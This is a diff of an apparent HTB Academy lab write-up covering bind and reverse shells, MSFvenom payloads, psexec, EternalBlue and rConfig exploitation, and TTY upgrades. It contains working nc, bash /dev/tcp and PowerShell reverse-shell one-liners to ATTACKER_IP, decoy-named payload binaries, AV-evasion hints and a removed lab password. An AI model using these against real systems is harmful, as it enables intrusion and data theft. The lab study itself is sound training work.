@@ -151,223 +151,440 @@
                 <span class="meta-badge">Platform: HTB Academy</span>
                 <span class="meta-badge">Date: March 2026</span>
             </div>
-            <p>Action log and walk-through covering bind shells, reverse shells, payload generation, and web shells on Windows and Linux targets.</p>
+            <p>Action log and walk-through covering bind shells, reverse shells, payload generation, and web shells on Windows and Linux targets – plus how defenders would see it.</p>
         </div>
 
         <div class="writeup-content">
             
             <!-- Section 1 -->
             <div class="section">
-                <h3>1 / 17 – Engagement Context</h3>
+                <h3>1 / 17 – Scenario & Engagement Context</h3>
                 <ul>
-                    <li>I assumed the role of a Junior Pentester at CAT5 Security.</li>
-                    <li>My target environment is Inlanefreight (legal HTB lab).</li>
-                    <li>My objectives:</li>
-                    <ul>
-                        <li>Execute bind and reverse shells.</li>
-                        <li>Deploy Metasploit and MSFvenom payloads.</li>
-                        <li>Compromise Linux, Windows, and web applications.</li>
-                    </ul>
+                    <li>Role: Junior pentester at <strong>CAT5 Security</strong>.</li>
+                    <li>Client: <strong>Inlanefreight</strong> (HTB-style lab, fully legal to attack).</li>
+                </ul>
+                <p><strong>High-Level Goals:</strong></p>
+                <ul>
+                    <li>Use and understand <strong>bind</strong> and <strong>reverse</strong> shells.</li>
+                    <li>Create and use payloads via <strong>Metasploit</strong>, <strong>MSFvenom</strong>, and <strong>Exploit-DB PoCs</strong>.</li>
+                    <li>Gain access on <strong>Linux</strong>, <strong>Windows</strong>, and <strong>web applications</strong>.</li>
+                    <li>Look at basic <strong>detection ideas</strong> from a blue-team point of view.</li>
                 </ul>
             </div>
 
             <!-- Section 2 -->
             <div class="section">
-                <h3>2 / 17 – Shells vs Payloads Setup</h3>
+                <h3>2 / 17 – Shells vs Payloads</h3>
+                <h4>2.1 – What is a Shell?</h4>
                 <ul>
-                    <li>I use shells to interact with the OS after gaining access.</li>
+                    <li>Interface that lets me run OS commands and see output.</li>
+                    <li><strong>Examples:</strong></li>
                     <ul>
-                        <li>Linux targets: <code>bash</code>, <code>sh</code>.</li>
-                        <li>Windows targets: <code>cmd.exe</code>, <code>powershell.exe</code>.</li>
+                        <li>Linux: <code>bash</code>, <code>sh</code>, <code>zsh</code>.</li>
+                        <li>Windows: <code>cmd.exe</code>, <code>powershell.exe</code>, <code>pwsh</code>.</li>
                     </ul>
-                    <li>I use payloads as the delivery mechanism to establish the shell.</li>
+                    <li>Normally used <em>after</em> some kind of access (RCE, file upload, exploit, etc.).</li>
+                </ul>
+                <h4>2.2 – What is a Payload?</h4>
+                <ul>
+                    <li>Code I deliver to the target to give me control (reverse shell, Meterpreter, etc.).</li>
+                    <li>Common sources:</li>
                     <ul>
-                        <li>I generate payloads via Metasploit or MSFvenom.</li>
+                        <li>Metasploit built-ins like <code>windows/meterpreter/reverse_tcp</code>.</li>
+                        <li><code>msfvenom</code> for standalone binaries/scripts.</li>
+                        <li>Exploit-DB / GitHub PoCs carrying shellcode or shell commands.</li>
                     </ul>
+                    <li><strong>Job:</strong> create a comms channel (bind shell, reverse shell, staged Meterpreter, …).</li>
                 </ul>
             </div>
 
             <!-- Section 3 -->
             <div class="section">
-                <h3>3 / 17 – Environment Preparation</h3>
+                <h3>3 / 17 – Anatomy of a Shell</h3>
+                <h4>3.1 – Local Shells in Pwnbox</h4>
                 <ul>
-                    <li>I checked my local Pwnbox configuration.</li>
-                    <li>I verified my cross-platform PowerShell version.</li>
+                    <li><strong>Bash</strong> – default Linux shell, text-based, good for scripting (<code>$</code> / <code>user@host:~$</code> prompt).</li>
+                    <li><strong>PowerShell Core (pwsh)</strong> – cross-platform PowerShell on Linux/Windows/macOS.</li>
                 </ul>
+                <p><strong>Checking PowerShell Edition:</strong></p>
                 <div class="command-block">
                     <code>$PSVersionTable</code>
                 </div>
                 <ul>
-                    <li>I noted that initial shells will be non-interactive.</li>
-                    <li>I will need to upgrade them to interactive TTY shells to use <code>sudo</code> or <code>vim</code>.</li>
+                    <li><strong>Key fields:</strong> <code>PSVersion</code> (version) and <code>PSEdition</code> (<em>Core</em> vs <em>Desktop</em>).</li>
+                    <li>Edition matters when choosing payloads / scripts that rely on specific PS features.</li>
+                </ul>
+                <h4>3.2 – Interactive vs Non-Interactive Shells</h4>
+                <ul>
+                    <li><strong>Interactive shell:</strong> supports Ctrl+C, arrows, tab, password prompts, <code>sudo</code>, editors, etc.</li>
+                    <li><strong>Primitive/non-interactive shell:</strong> often what you get from raw <code>nc</code> reverse shells.</li>
+                    <li>Typical issues: no prompt, broken arrows/tab, <code>sudo</code>/<code>ssh</code>/editors unreliable.</li>
+                    <li><strong>Plan:</strong> use these shells to get in, then upgrade to a proper TTY later.</li>
                 </ul>
             </div>
 
             <!-- Section 4 -->
             <div class="section">
-                <h3>4 / 17 – Executing Bind Shells</h3>
+                <h3>4 / 17 – Bind Shells</h3>
+                <h4>4.1 – Concept</h4>
                 <ul>
-                    <li>I configured the victim to open a port and wait for my connection.</li>
-                    <li>I connected from my attack box to the open port.</li>
+                    <li>Victim opens a TCP port and binds a shell to it.</li>
+                    <li>Attacker connects in to control that shell.</li>
+                    <li>Requires inbound connectivity to the victim (often blocked in real networks).</li>
                 </ul>
-                <p><strong>Linux Target (with <code>-e</code>):</strong></p>
+                <h4>4.2 – Generic Linux Bind Shell (<code>nc -e</code>)</h4>
                 <div class="command-block">
-                    <code># Executed on Victim
+                    <code># On victim: bind a bash shell to TCP port 4444
 nc -lvnp 4444 -e /bin/bash
 
-# Executed on Attack Box
+# On attacker: connect to the victim's bind shell
 nc &lt;victim-ip&gt; 4444</code>
                 </div>
-                <p><strong>Linux Target (without <code>-e</code> support):</strong></p>
+                <h4>4.3 – Linux Bind Shell Without <code>-e</code> (mkfifo Trick)</h4>
                 <div class="command-block">
-                    <code># Executed on Victim (mkfifo trick)
+                    <code># On victim
 mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2&gt;&amp;1 | nc -lvnp 4444 &gt; /tmp/f
 
-# Executed on Attack Box
+# On attacker
+nc &lt;victim-ip&gt; 4444</code>
+                </div>
+                <h4>4.4 – mkfifo Bind Shell with Cleanup</h4>
+                <div class="command-block">
+                    <code># On victim
+mkfifo /tmp/f; nc -lvnp 4444 0&lt;/tmp/f | /bin/sh &gt;/tmp/f 2&gt;&amp;1; rm /tmp/f
+
+# On attacker
 nc &lt;victim-ip&gt; 4444</code>
                 </div>
                 <div class="warning-box">
-                    <strong>Note:</strong> Bind shells often fail against real firewalls. I prefer reverse shells for actual engagements.
+                    <strong>Personal Note:</strong> In real assessments I usually prefer <strong>reverse shells</strong> – getting outbound traffic from a victim is much easier than opening inbound ports through firewalls/NAT. Bind shells are great for labs and understanding the concept.
                 </div>
             </div>
 
             <!-- Section 5 -->
             <div class="section">
-                <h3>5 / 17 – Executing Reverse Shells (Windows Lab)</h3>
+                <h3>5 / 17 – Reverse Shells (Windows Lab)</h3>
+                <h4>5.1 – Concept</h4>
                 <ul>
-                    <li>Target: 10.129.11.9 (ACADEMY-SHELLS-WIN10).</li>
-                    <li>I set up my attack box to listen for incoming connections.</li>
-                    <li>I executed a payload on the victim to dial back to my IP.</li>
+                    <li>Victim = <strong>client</strong> (dials out), attacker = <strong>listener</strong>.</li>
+                    <li>Reverse shells are more realistic because egress is usually less restricted.</li>
                 </ul>
-                <p><strong>Step 1: Start Listener</strong></p>
+                <h4>5.2 – Generic Linux Reverse Shell</h4>
                 <div class="command-block">
-                    <code>nc -lvnp 4444</code>
+                    <code># On attacker
+nc -lvnp 4444
+
+# On victim
+bash -i &gt;&amp; /dev/tcp/ATTACKER_IP/4444 0&gt;&amp;1</code>
                 </div>
-                <p><strong>Step 2: Execute PowerShell Payload on Target</strong></p>
+                <h4>5.3 – HTB Lab: ACADEMY-SHELLS-WIN10</h4>
+                <ul>
+                    <li>Target: <code>10.129.11.9</code> – <strong>ACADEMY-SHELLS-WIN10</strong>.</li>
+                    <li>Access: RDP as <code>htb-student / [REDACTED]</code>.</li>
+                    <li>Task: establish a reverse shell back to my box and identify hostname.</li>
+                </ul>
+                <p><strong>Listener:</strong></p>
+                <div class="command-block">
+                    <code># 1) Find my VPN IP
+ip a | grep tun0
+
+# 2) Start listener
+nc -lvnp 4444</code>
+                </div>
+                <p><strong>PowerShell Reverse Shell (on target):</strong></p>
                 <div class="command-block">
                     <code>powershell -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '&gt; ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}"</code>
                 </div>
                 <ul>
-                    <li><strong>Challenge:</strong> Entering the complex PowerShell one-liner accurately without triggering syntax or character escaping errors in the Windows command line.</li>
-                    <li><strong>Solution:</strong> I built and verified the payload locally on my attack box first. I then copied it via the RDP shared clipboard directly into the target's prompt to avoid typos.</li>
+                    <li><strong>Challenge:</strong> getting the full one-liner into Windows cmd without breaking quoting/escaping.</li>
+                    <li><strong>Fix:</strong> build/test locally, then copy via RDP clipboard.</li>
                 </ul>
                 <div class="success-box">
-                    <strong>Verification:</strong> I caught the shell on my listener. I ran <code>hostname</code>. Output was <code>[REDACTED]</code>.
+                    <strong>Verification:</strong><br>
+                    In the shell that connected back:<br>
+                    <code>hostname</code> → <code>shells-Win10</code>.<br>
+                    Confirms the victim is the client in this reverse connection model.
                 </div>
             </div>
 
             <!-- Section 6 -->
             <div class="section">
-                <h3>6 / 17 – Payload Generation Workflow</h3>
+                <h3>6 / 17 – Introduction to Payloads</h3>
+                <h4>6.1 – What a Payload Actually Does</h4>
                 <ul>
-                    <li>I used Metasploit for direct exploitation.</li>
-                    <li>I used MSFvenom to generate standalone files.</li>
+                    <li>Runs on the target <em>after</em> RCE/upload/exploit triggers.</li>
+                    <li>Main jobs:</li>
+                    <ul>
+                        <li>Give me a shell (bind or reverse).</li>
+                        <li>Give me an agent (e.g. Meterpreter).</li>
+                        <li>Run a single command (download + execute another stage).</li>
+                    </ul>
+                    <li><strong>Mental model:</strong> exploit opens the door, payload walks through.</li>
                 </ul>
-                <p><strong>Metasploit Flow:</strong></p>
+                <h4>6.2 – Where My Payloads Come From</h4>
+                <ul>
+                    <li><strong>Metasploit modules:</strong> choose <code>PAYLOAD</code> inside <code>msfconsole</code>.</li>
+                    <li><strong>MSFvenom:</strong> standalone files: <code>.exe</code>, <code>.elf</code>, <code>.aspx</code>, <code>.php</code>, …</li>
+                    <li><strong>Manual one-liners:</strong> Bash <code>/dev/tcp</code>, PowerShell reverse shells.</li>
+                    <li><strong>Exploit PoCs:</strong> swap their payload section for my own shellcode/command.</li>
+                </ul>
+                <h4>6.3 – Metasploit Payload Flow</h4>
                 <div class="command-block">
                     <code>msfconsole
 use &lt;exploit/module&gt;
 set RHOSTS &lt;target-ip&gt;
 set RPORT &lt;port&gt;
+
+# choose payload
 set PAYLOAD &lt;payload/name&gt;
-set LHOST &lt;tun0-ip&gt;
+
+# reverse shells: listener settings
+set LHOST &lt;my-vpn-ip (tun0)&gt;
 set LPORT &lt;my-port&gt;
+
 run</code>
                 </div>
                 <div class="highlight-box">
-                    <strong>Payload Selection & Evasion:</strong><br>
-                    - I use <strong>Staged</strong> payloads when exploit buffer space is restricted.<br>
-                    - I use <strong>Stageless</strong> payloads for stability over bad networks.<br>
-                    - If AV detects my payload, I switch to memory-only execution (living off the land), generate raw shellcode for injection, or use basic encoding wrappers.
+                    <strong>Bind vs Reverse in Metasploit:</strong><br>
+                    - <code>.../reverse_tcp</code> → target connects back to me.<br>
+                    - <code>.../bind_tcp</code> → target listens, I connect in.
                 </div>
+                <h4>6.4 – MSFvenom Cheat Slot</h4>
+                <div class="command-block">
+                    <code># Generic
+msfvenom -p &lt;payload&gt; LHOST=&lt;my-vpn-ip&gt; LPORT=&lt;my-port&gt; -f &lt;format&gt; -o shell.&lt;ext&gt;
+
+# Windows x64 Meterpreter reverse shell
+msfvenom -p windows/x64/meterpreter/reverse_tcp \
+  LHOST=10.10.14.5 LPORT=4444 -f exe -o shell.exe
+
+# Linux x64 reverse shell ELF
+msfvenom -p linux/x64/shell_reverse_tcp \
+  LHOST=10.10.14.5 LPORT=4444 -f elf -o shell.elf</code>
+                </div>
+                <ul>
+                    <li><code>-p</code> – payload name (OS + type + transport).</li>
+                    <li><code>-f</code> – output format (<code>exe</code>, <code>elf</code>, <code>aspx</code>, <code>php</code>, <code>raw</code>, …).</li>
+                    <li><code>-o</code> – output file.</li>
+                </ul>
+                <h4>6.5 – Manual “Custom” Payloads</h4>
+                <p><strong>Linux bash reverse shell:</strong></p>
+                <div class="command-block">
+                    <code># On attacker
+nc -lvnp 4444
+
+# On victim
+bash -i &gt;&amp; /dev/tcp/ATTACKER_IP/4444 0&gt;&amp;1</code>
+                </div>
+                <p><strong>Windows PowerShell reverse shell:</strong></p>
+                <div class="command-block">
+                    <code>powershell -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){$data = (New-Object System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback = (iex $data 2&gt;&amp;1 | Out-String );$sendback2  = $sendback + 'PS ' + (pwd).Path + '&gt; ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}"</code>
+                </div>
+                <h4>6.6 – Staged vs Stageless</h4>
+                <ul>
+                    <li><strong>Staged:</strong> small stager + extra network round trips; good when space is tight.</li>
+                    <li><strong>Stageless:</strong> full payload in one go; simpler and more robust on flaky networks.</li>
+                    <li>For OSCP-style labs I default to <strong>stageless</strong> unless I’m size-constrained.</li>
+                </ul>
             </div>
 
             <!-- Section 7 -->
             <div class="section">
-                <h3>7 / 17 – Psexec Exploitation Walk-through</h3>
+                <h3>7 / 17 – Metasploit psexec Lab (Windows)</h3>
+                <h4>7.1 – Goal</h4>
                 <ul>
-                    <li>Target: 10.129.201.160.</li>
-                    <li>I obtained valid SMB credentials: <code>htb-student</code> / <code>HTB_@cademy_stdnt!</code></li>
-                    <li>I loaded the <code>psexec</code> module in Metasploit.</li>
+                    <li>Use <code>exploit/windows/smb/psexec</code> to get a Meterpreter shell.</li>
+                    <li>Identify a sensitive document under <code>C:\Users\htb-student\Documents</code>.</li>
                 </ul>
+                <h4>7.2 – Setup</h4>
+                <ul>
+                    <li>Target: <code>10.129.201.160</code> (Windows, SMB 445).</li>
+                    <li>Creds: <code>htb-student / [REDACTED]</code>.</li>
+                    <li>Module: <code>exploit/windows/smb/psexec</code>.</li>
+                    <li>Payload: <code>windows/meterpreter/reverse_tcp</code> (lab default).</li>
+                </ul>
+                <h4>7.3 – Running psexec</h4>
                 <div class="command-block">
-                    <code>use exploit/windows/smb/psexec
+                    <code>msfconsole
+
+use exploit/windows/smb/psexec
+
+# PAYLOAD already set: windows/meterpreter/reverse_tcp
+
 set RHOSTS 10.129.201.160
 set SMBUser htb-student
-set SMBPass HTB_@cademy_stdnt!
+set SMBPass [REDACTED]
 set LHOST 10.10.15.191
 set LPORT 4444
+
 exploit</code>
                 </div>
-                <ul>
-                    <li>I successfully caught a SYSTEM Meterpreter shell.</li>
-                    <li><strong>Decision:</strong> I chose a staged Meterpreter payload (<code>windows/meterpreter/reverse_tcp</code>) because the psexec module manages the staging process automatically and I wanted immediate access to advanced post-exploitation commands.</li>
-                    <li>I navigated to <code>C:\Users\htb-student\Documents</code>.</li>
-                    <li><strong>Challenge:</strong> Navigating a Windows file system using Meterpreter-specific commands rather than standard native CMD tools.</li>
-                </ul>
-                <div class="success-box">
-                    <strong>Flag Retrieval:</strong> I executed <code>search -f [REDACTED].txt</code> in Meterpreter. I read the file to capture the flag.
+                <div class="highlight-box">
+                    <strong>Key output:</strong><br>
+                    - Selecting PowerShell target → using PowerShell-based execution.<br>
+                    - <code>Meterpreter session 1 opened</code> → staged Meterpreter callback worked.
                 </div>
+                <h4>7.4 – Navigating with Meterpreter</h4>
+                <div class="command-block">
+                    <code>(Meterpreter 1)(C:\Windows\system32) &gt; cd C:\\Users\\htb-student\\Documents
+(Meterpreter 1)(C:\Users\htb-student\Documents) &gt; ls</code>
+                </div>
+                <p>Interesting file: <code>staffsalaries.txt</code>.</p>
+                <h4>7.5 – Reading the Sensitive File</h4>
+                <div class="command-block">
+                    <code>(Meterpreter 1)(C:\Users\htb-student\Documents) &gt; cat staffsalaries.txt</code>
+                </div>
+                <p>Contains executive salary data – clearly sensitive.</p>
+                <div class="success-box">
+                    <strong>Lab answer:</strong> sensitive filename is <code>staffsalaries.txt</code>.
+                </div>
+                <h4>7.6 – Using Meterpreter Search</h4>
+                <div class="command-block">
+                    <code>(Meterpreter 1) &gt; search -f staffsalaries.txt</code>
+                </div>
+                <p>Good pattern when you don’t know the directory path up-front.</p>
+                <h4>7.7 – Mental Model</h4>
+                <ul>
+                    <li>Exploit: <code>psexec</code> over SMB with known creds.</li>
+                    <li>Payload: staged <code>windows/meterpreter/reverse_tcp</code>.</li>
+                    <li>Transport: reverse TCP 4444 from target → my VPN IP.</li>
+                    <li>Post-ex: use Meterpreter for filesystem access and data exfiltration.</li>
+                </ul>
             </div>
 
             <!-- Section 8 -->
             <div class="section">
-                <h3>8 / 17 – Creating Standalone Binaries (MSFvenom)</h3>
+                <h3>8 / 17 – Crafting Payloads with MSFvenom</h3>
+                <h4>8.1 – Why MSFvenom?</h4>
                 <ul>
-                    <li>I needed payloads for targets without direct exploit vectors.</li>
-                    <li>I listed available modules using <code>msfvenom -l payloads</code>.</li>
-                    <li><strong>Decision:</strong> I generated stageless payloads to avoid secondary download stages, increasing reliability for manual execution.</li>
-                    <li><strong>AV Bypass Strategy:</strong> If Defender kills these raw executables, I generate raw shellcode (<code>-f raw</code> or <code>-f csharp</code>) and write a custom runner to execute it in memory.</li>
+                    <li>When Metasploit can’t reach a target directly (no route, external-only, etc.).</li>
+                    <li>Generate a payload file, deliver it (email/USB/link), wait for execution.</li>
+                    <li>Can also encode/encrypt payloads to dodge simple AV signatures.</li>
                 </ul>
-                <p><strong>Generated Linux ELF:</strong></p>
+                <h4>8.2 – Listing Payloads</h4>
+                <div class="command-block">
+                    <code>msfvenom -l payloads</code>
+                </div>
+                <p>Output shows OS, staged vs stageless, and description for each payload.</p>
+                <h4>8.3 – Staged vs Stageless in Names</h4>
+                <ul>
+                    <li>Staged: <code>linux/x86/shell/reverse_tcp</code> (separate shell + network stages).</li>
+                    <li>Stageless: <code>linux/zarch/meterpreter_reverse_tcp</code> (single combined blob).</li>
+                    <li>Windows pair: <code>windows/meterpreter/reverse_tcp</code> (staged) vs <code>windows/meterpreter_reverse_tcp</code> (stageless).</li>
+                </ul>
+                <h4>8.4 – General MSFvenom Pattern</h4>
+                <div class="command-block">
+                    <code>msfvenom -p &lt;payload&gt; LHOST=&lt;my-ip&gt; LPORT=&lt;my-port&gt; -f &lt;format&gt; &gt; output_file</code>
+                </div>
+                <ul>
+                    <li><code>-p</code> select payload, <code>LHOST/LPORT</code> for reverse callback, <code>-f</code> format, then redirect to file.</li>
+                </ul>
+                <h4>8.5 – Stageless Linux Reverse Shell</h4>
                 <div class="command-block">
                     <code>msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf &gt; createbackup.elf</code>
                 </div>
-                <p><strong>Generated Windows EXE:</strong></p>
+                <p>Delivered to a Linux admin box; once executed, netcat listener caught a shell on port 443.</p>
+                <h4>8.6 – Stageless Windows Reverse Shell</h4>
                 <div class="command-block">
                     <code>msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe &gt; BonusCompensationPlanpdf.exe</code>
                 </div>
+                <p>Executed on a Windows 10 host; listener received a basic cmd shell.</p>
+                <div class="warning-box">
+                    <strong>Real world note:</strong> raw msfvenom <code>.exe</code>s are usually eaten by Defender. In a real engagement I’d push raw shellcode (<code>-f raw</code>/<code>-f csharp</code>) and use a custom loader.
+                </div>
+                <h4>8.7 – MSFvenom Checklist</h4>
                 <ul>
-                    <li>I set up local netcat listeners and waited for the victim to execute the files.</li>
+                    <li>Pick correct OS/arch (<code>linux/x64</code>, <code>windows/x86</code>, …).</li>
+                    <li>Choose staged vs stageless based on size/network conditions.</li>
+                    <li>Set reachable <code>LHOST</code>/<code>LPORT</code> and believable filename.</li>
+                    <li>Plan delivery + start listener before the target executes.</li>
                 </ul>
             </div>
 
             <!-- Section 9 -->
             <div class="section">
-                <h3>9 / 17 – EternalBlue Walk-through (MS17-010)</h3>
+                <h3>9 / 17 – MS17-010 EternalBlue Lab (Windows)</h3>
+                <h4>9.1 – Goal & Lab Answers</h4>
                 <ul>
-                    <li>Target OS identified as Windows via Nmap TTL (128).</li>
-                    <li>I verified SMB vulnerability using Metasploit scanner <code>smb_ms17_010</code>.</li>
-                    <li>I launched the exploit.</li>
+                    <li>Exploit MS17-010 on a Windows SMB host.</li>
+                    <li>Get Meterpreter, find <code>flag.txt</code> on <code>C:\</code>.</li>
                 </ul>
+                <div class="success-box">
+                    <strong>Key answers:</strong><br>
+                    - Malicious file extension: <code>.bat</code><br>
+                    - Vulnerable issue: <code>MS17-010</code><br>
+                    - Flag: <code>[REDACTED]</code>
+                </div>
+                <h4>9.2 – Recon & Vuln Check</h4>
+                <div class="command-block">
+                    <code>ping &lt;TARGET_IP&gt;   # TTL ≈ 128 → Windows
+nmap -sC -sV -O -v &lt;TARGET_IP&gt;</code>
+                </div>
+                <p>Then verify with Metasploit:</p>
+                <div class="command-block">
+                    <code>msfconsole
+use auxiliary/scanner/smb/smb_ms17_010
+set RHOSTS &lt;TARGET_IP&gt;
+run</code>
+                </div>
+                <h4>9.3 – Exploiting with ms17_010_psexec</h4>
                 <div class="command-block">
                     <code>use exploit/windows/smb/ms17_010_psexec
 set RHOSTS &lt;TARGET_IP&gt;
 set LHOST &lt;MY_TUN0_IP&gt;
 set LPORT 4444
+# PAYLOAD default: windows/meterpreter/reverse_tcp
 exploit</code>
                 </div>
-                <ul>
-                    <li>I gained a SYSTEM Meterpreter session.</li>
-                    <li>I dropped into a native Windows command prompt using the <code>shell</code> command.</li>
-                    <li><strong>Challenge:</strong> Remembering to switch context from Linux syntax (<code>cat</code>) to Windows syntax (<code>type</code>) when reading files in CMD.</li>
-                </ul>
-                <div class="success-box">
-                    <strong>Flags Retrieved:</strong><br>
-                    - Vulnerability: <code>[REDACTED]</code>.<br>
-                    - Exploit Extension: <code>[REDACTED]</code>.<br>
-                    - I found and read the flag using <code>type flag.txt</code>. Value: <code>[REDACTED]</code>.
+                <h4>9.4 – Finding <code>flag.txt</code></h4>
+                <div class="command-block">
+                    <code>(Meterpreter 1)(C:\Windows\system32) &gt; search -f flag.txt -d C:\</code>
                 </div>
+                <p>Two hits: <code>C:\flag.txt</code> and <code>C:\inetpub\Flag.txt</code>.</p>
+                <h4>9.5 – Drop to cmd.exe & Read Flag</h4>
+                <div class="command-block">
+                    <code>(Meterpreter 1) &gt; shell
+
+C:\Windows\system32&gt; cd C:\
+
+C:\&gt; type flag.txt
+[REDACTED]</code>
+                </div>
+                <p>Reminder: <code>cat</code> is Linux, <code>type</code> is Windows.</p>
+                <h4>9.7 – Mental Model</h4>
+                <ul>
+                    <li>Vuln: MS17-010 on SMB.</li>
+                    <li>Exploit: <code>exploit/windows/smb/ms17_010_psexec</code>.</li>
+                    <li>Payload: staged <code>windows/meterpreter/reverse_tcp</code>.</li>
+                    <li>Post-ex: <code>search</code> for <code>flag.txt</code>, then <code>type</code> in cmd.</li>
+                </ul>
             </div>
 
             <!-- Section 10 -->
             <div class="section">
-                <h3>10 / 17 – Exploiting Web Apps (rConfig RCE)</h3>
+                <h3>10 / 17 – Infiltrating Unix/Linux (rConfig on CentOS)</h3>
+                <p>Here I moved from web app enumeration to a shell on a CentOS host running rConfig 3.9.6.</p>
+                <h4>10.1 – Initial Enumeration</h4>
+                <div class="command-block">
+                    <code>nmap -sC -sV 10.129.201.101</code>
+                </div>
                 <ul>
-                    <li>Target: 10.129.201.101.</li>
-                    <li>I scanned the host. Nmap revealed CentOS, Apache, and rConfig 3.9.6.</li>
-                    <li>I selected an authenticated file upload RCE module in Metasploit.</li>
+                    <li>Apache 2.4.6, PHP 7.2.34 on CentOS.</li>
+                    <li>MySQL, FTP, SSH also exposed.</li>
+                    <li>Browsing <code>https://10.129.201.101</code> showed rConfig 3.9.6.</li>
                 </ul>
+                <h4>10.2 – Finding the rConfig Exploit</h4>
+                <ul>
+                    <li>Looked up public vulns for rConfig 3.9.6.</li>
+                    <li>Metasploit search:</li>
+                </ul>
+                <div class="command-block">
+                    <code>search rconfig</code>
+                </div>
+                <p>Picked <code>exploit/linux/http/rconfig_vendors_auth_file_upload_rce</code> (auth file upload → RCE).</p>
+                <div class="highlight-box">
+                    <strong>Payload language question:</strong> Metasploit defaulted to <code>php/meterpreter/reverse_tcp</code> → payload is <strong>PHP</strong>, which matches a PHP web app on Apache.</div>
+                <h4>10.3 – Exploiting rConfig</h4>
                 <div class="command-block">
                     <code>use exploit/linux/http/rconfig_vendors_auth_file_upload_rce
 set RHOSTS 10.129.201.101
@@ -375,107 +592,411 @@ set LHOST 10.10.15.191
 set LPORT 4444
 exploit</code>
                 </div>
-                <ul>
-                    <li>I observed the default payload was <strong>[REDACTED]</strong> (<code>[REDACTED]/meterpreter/reverse_tcp</code>).</li>
-                    <li>I caught the shell and upgraded it to a TTY.</li>
-                    <li>I investigated the file system for flags.</li>
-                    <li><strong>Challenge:</strong> The initial shell was highly unstable and non-interactive. Upgrading to a full TTY using Python was required immediately to prevent session drops.</li>
-                </ul>
+                <p>Result: authenticated, uploaded a PHP Meterpreter payload, triggered it, and opened <code>Meterpreter 1</code>.</p>
+                <h4>10.4 – TTY Upgrade</h4>
+                <div class="command-block">
+                    <code>(Meterpreter 1) &gt; shell
+python -c 'import pty; pty.spawn("/bin/sh")'
+sh-4.2$ whoami
+apache</code>
+                </div>
+                <p>Upgraded to a usable interactive shell as <code>apache</code>.</p>
+                <h4>10.5 – /devicedetails & Router Hostname</h4>
+                <div class="command-block">
+                    <code>sh-4.2$ cd /
+sh-4.2$ ls
+...
+devicedetails
+sh-4.2$ cd devicedetails
+sh-4.2$ ls
+edgerouter-isp.yml  hostnameinfo.txt
+sh-4.2$ cat hostnameinfo.txt</code>
+                </div>
+                <p>The note states YAML files are named after the router hostname. Only one YAML exists:</p>
                 <div class="success-box">
-                    <strong>Answers:</strong><br>
-                    - Payload language: [REDACTED].<br>
-                    - I navigated to <code>/devicedetails</code>. I read the YAML file. Router Hostname: <strong>[REDACTED]</strong>.
+                    <strong>Router hostname:</strong> <code>[REDACTED]</code> (from <code>edgerouter-isp.yml</code>).
                 </div>
             </div>
 
             <!-- Section 11 -->
             <div class="section">
-                <h3>11 / 17 – Upgrading to Interactive Shells</h3>
+                <h3>11 / 17 – Spawning Interactive Shells</h3>
+                <p>Focus here: turn ugly non-TTY shells into proper interactive shells.</p>
+                <h4>11.1 – Why It Matters</h4>
                 <ul>
-                    <li>My initial exploit shells were restricted (no prompt, broken formatting).</li>
-                    <li><strong>Decision Tree:</strong><br>
-                        1. Check for <code>python3</code> or <code>python</code> to spawn a PTY.<br>
-                        2. If Python is missing, try using the <code>script</code> binary.<br>
-                        3. If all local tools fail, upload a statically compiled <code>socat</code> binary to force a stable TTY.
-                    </li>
-                    <li>I used Python to spawn a fully interactive PTY.</li>
+                    <li>Non-TTY shells break <code>su</code>/<code>sudo</code>, editors, prompts, and job control.</li>
+                    <li>TTY shells behave like a normal terminal, which is essential for privesc and pivoting.</li>
                 </ul>
+                <h4>11.2 – Python PTY Upgrade</h4>
                 <div class="command-block">
                     <code>python -c 'import pty; pty.spawn("/bin/sh")'
-# If python3 is the only version available:
+# or
 python3 -c 'import pty; pty.spawn("/bin/bash")'</code>
                 </div>
-                <ul>
-                    <li>This restored my ability to use command history, <code>su</code>, and reliable text editors.</li>
-                </ul>
+                <p>After running this I get a better prompt and working line editing:</p>
                 <div class="command-block">
-                    <code>script /dev/null -c bash</code>
+                    <code>sh-4.2$ whoami
+apache</code>
+                </div>
+                <h4>11.3 – Other Techniques (Quick Ref)</h4>
+                <ul>
+                    <li><code>script /dev/null -c bash</code> if <code>script</code> exists.</li>
+                    <li>Terminal-side fixes: <code>Ctrl+Z</code> → <code>stty raw -echo</code> → <code>fg</code> → <code>reset</code>.</li>
+                    <li>As a last resort, upload a static <code>socat</code> and re-connect with a fully interactive listener.</li>
+                </ul>
+                <div class="highlight-box">
+                    <strong>Habit:</strong> upgrading the shell is one of my first steps after initial code execution.
                 </div>
             </div>
 
             <!-- Section 12 -->
             <div class="section">
-                <h3>12 / 17 – Deploying Web Shells</h3>
+                <h3>12 / 17 – Introduction to Web Shells</h3>
+                <h4>12.1 – What is a Web Shell?</h4>
                 <ul>
-                    <li>I use web shells when standard reverse shells fail due to strict egress filtering.</li>
-                    <li>I exploit a vulnerability (like file upload) to drop a server-side script.</li>
-                    <li>I access the script via HTTP to execute OS commands.</li>
-                    <li>I match the shell to the environment: PHP for Linux/Apache, ASPX for Windows/IIS.</li>
-                    <li>These shells run as low-privilege service accounts (e.g., <code>www-data</code>).</li>
+                    <li>Server-side script (<code>php</code>, <code>aspx</code>, <code>jsp</code>) that executes OS commands and returns output over HTTP.</li>
+                    <li>Controlled via browser or tools like <code>curl</code>/<code>wget</code>.</li>
